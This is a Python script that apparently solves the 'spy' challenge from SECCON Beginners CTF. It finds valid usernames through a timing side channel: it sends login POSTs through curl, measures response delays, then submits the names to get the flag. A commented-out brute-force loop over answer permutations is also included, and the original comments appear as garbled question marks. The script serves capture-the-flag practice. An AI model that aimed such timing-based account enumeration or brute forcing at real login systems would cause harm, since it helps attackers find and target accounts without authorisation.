import re
import time
import codecs
import itertools
import subprocess
from subprocess import PIPE
# # For Debugging
# from IPython import embed

name = ["Arthur","Barbara","Christine","David","Elbert","Franklin","George","Harris",
        "Ivan","Jane","Kevin","Lazarus","Marc","Nathan","Oliver","Paul","Quentin","Randolph",
        "Scott","Tony","Ulysses","Vincent","Wat","Ximena","Yvonne","Zalmon"]

URL1 = "https://spy.quals.beginners.seccon.jp/"
URL2 = "https://spy.quals.beginners.seccon.jp/challenge"

GET = ["curl", "-X", "GET", ""]
command = ["curl", "-X", "POST", "-d", "", ""]

param = ["name=" + n + "&password=hogehoge" for n in name]
ans = []

# ?????????????
GET[3] = URL1
init = time.time()
data = subprocess.check_output(GET)
# ???????????????????????
check = 2*(time.time() - init)

"""??????????????????????????
   ??????????????????????????
# for i in range(len(param)):
#     command[4] = param[i]
#     command[5] = URL1
#     data = subprocess.check_output(command)
#     data = re.search(r"[0-9].[0-9]{7}", codecs.decode(data,"utf-8")).group()
#     if float(data) > 0.01: 
#         ans.append(name[i])
"""

for i in range(len(param)):
    command[4] = param[i]
    command[5] = URL1
    init = time.time()
    data = subprocess.check_output(command)
    now = time.time() - init
    if now > check:
        ans.append(name[i])

ans = ["answer=" + n for n in ans]

command[4] = "&".join(ans)
command[5] = URL2
data = subprocess.check_output(command)
data = re.search(r"ctf4b.*}", codecs.decode(data,"utf-8")).group()
print()
print(data)

# ???
"""2^26??????????
import itertools
import subprocess
from subprocess import PIPE

l = ["answer=Arthur","answer=Barbara","answer=Christine","answer=David",
    "answer=Elbert","answer=Franklin","answer=George","answer=Harris",
    "answer=Ivan","answer=Jane","answer=Kevin","answer=Lazarus",
    "answer=Marc","answer=Nathan","answer=Oliver","answer=Paul",
    "answer=Quentin","answer=Randolph","answer=Scott","answer=Tony",
    "answer=Ulysses","answer=Vincent","answer=Wat","answer=Ximena",
    "answer=Yvonne","answer=Zalmon"]

for x in range(1,27):
    for v in itertools.permutations(l, x):
        command = ["curl", "-X", "POST", "-d", "", "https://spy.quals.beginners.seccon.jp/challenge"]
        command[4] = "&".join(v)
        # print(command[4],end="\n\n")
        data = subprocess.check_output(command)
        if "Wrong" not in str(data):
            print(str(data))
            exit(0)
"""
